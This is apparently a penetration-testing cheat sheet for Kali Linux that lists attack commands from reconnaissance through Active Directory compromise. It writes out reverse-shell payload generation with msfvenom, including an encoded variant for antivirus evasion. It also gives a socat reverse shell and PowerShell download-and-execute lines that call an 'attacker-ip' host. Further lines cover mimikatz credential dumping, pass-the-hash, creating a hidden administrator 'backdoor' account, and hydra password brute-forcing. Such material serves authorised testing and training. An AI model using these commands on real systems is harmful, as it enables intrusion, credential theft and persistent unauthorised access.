
# ðŸ›  Penetration Testing Cheat Sheet (Kali Linux)

## ðŸ“Œ 1. Information Gathering

### ðŸ”¹ Passive Recon
- Whois Lookup:  
  ```bash
  whois target.com
  ```
- Google Dorking:  
  ```
  site:target.com filetype:pdf
  ```
- Subdomain Enumeration:  
  ```bash
  theHarvester -d target.com -l 500 -b google
  ```

### ðŸ”¹ Active Recon
- DNS Enumeration:  
  ```bash
  dig axfr @dns-server target.com
  dnsenum target.com
  ```
- Port Scanning (Nmap):  
  ```bash
  nmap -p- -sC -sV -oN scan.txt target_ip
  ```
- SMB Enumeration:  
  ```bash
  enum4linux -a target_ip
  smbclient -L //target_ip/
  ```

## ðŸ“Œ 2. Vulnerability Scanning

### ðŸ”¹ Nmap Scripts
```bash
nmap --script vuln target_ip
```
### ðŸ”¹ Nessus Scan
1. Start Nessus:  
   ```bash
   systemctl start nessusd
   ```
2. Login to `https://127.0.0.1:8834`.

## ðŸ“Œ 3. Exploitation

### ðŸ”¹ SQL Injection
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

### ðŸ”¹ XSS Attack
```html
<script>alert('XSS');</script>
```

### ðŸ”¹ Buffer Overflow (Windows)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f exe > exploit.exe
```

### ðŸ”¹ Public Exploits
```bash
searchsploit apache
```

## ðŸ“Œ 4. Privilege Escalation

### ðŸ”¹ Linux PE
```bash
sudo -l
find / -perm -4000 2>/dev/null
```
Tool:  
```bash
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/main/linPEAS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### ðŸ”¹ Windows PE
```powershell
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
Tool:  
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/winPEAS.bat')"
```

## ðŸ“Œ 5. Post-Exploitation

### ðŸ”¹ Dump Credentials (Windows)
```powershell
mimikatz
sekurlsa::logonpasswords
```

### ðŸ”¹ Maintain Access
```bash
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

## ðŸ“Œ 6. Password Attacks

### ðŸ”¹ Wordlist Attack
```bash
hydra -l admin -P rockyou.txt target.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

### ðŸ”¹ Crack Hashes
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## ðŸ“Œ 7. File Transfers

### ðŸ”¹ Linux
```bash
wget http://attacker-ip/file.sh
```
### ðŸ”¹ Windows
```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker-ip/file.exe','C:\Users\Public\file.exe')"
```

## ðŸ“Œ 8. Antivirus Evasion
- Encode Payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -e x86/shikata_ga_nai -o evade.exe
```

## ðŸ“Œ 9. Tunneling & Port Forwarding

### ðŸ”¹ SSH Tunneling
```bash
ssh -L 8080:localhost:80 user@target
```

### ðŸ”¹ Socat Reverse Shell
```bash
socat tcp-connect:attacker-ip:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

## ðŸ“Œ ðŸ”Ÿ Active Directory Attacks

### ðŸ”¹ BloodHound Enumeration
```bash
neo4j console &
bloodhound
```

### ðŸ”¹ Pass-the-Hash (Windows)
```powershell
mimikatz
sekurlsa::pth /user:Administrator /domain:target.local /ntlm:HASH
```

## ðŸ“Œ ðŸ“Œ Full Attack Flow Example

1. Recon â†’ Gather info (`nmap`, `recon-ng`).
2. Scan â†’ Find vulnerabilities (`nmap --script vuln`).
3. Enumerate â†’ Test exposed services (`enum4linux`).
4. Exploit â†’ Use public exploits (`searchsploit`).
5. Low Privilege Shell â†’ Gain initial access.
6. Privilege Escalation â†’ Get root/admin (`winPEAS`, `linPEAS`).
7. Credential Dumping â†’ Extract passwords (`mimikatz`).
8. Pivot & Lateral Movement â†’ Exploit other machines (`proxychains`).
9. Cleanup & Report â†’ Document findings.
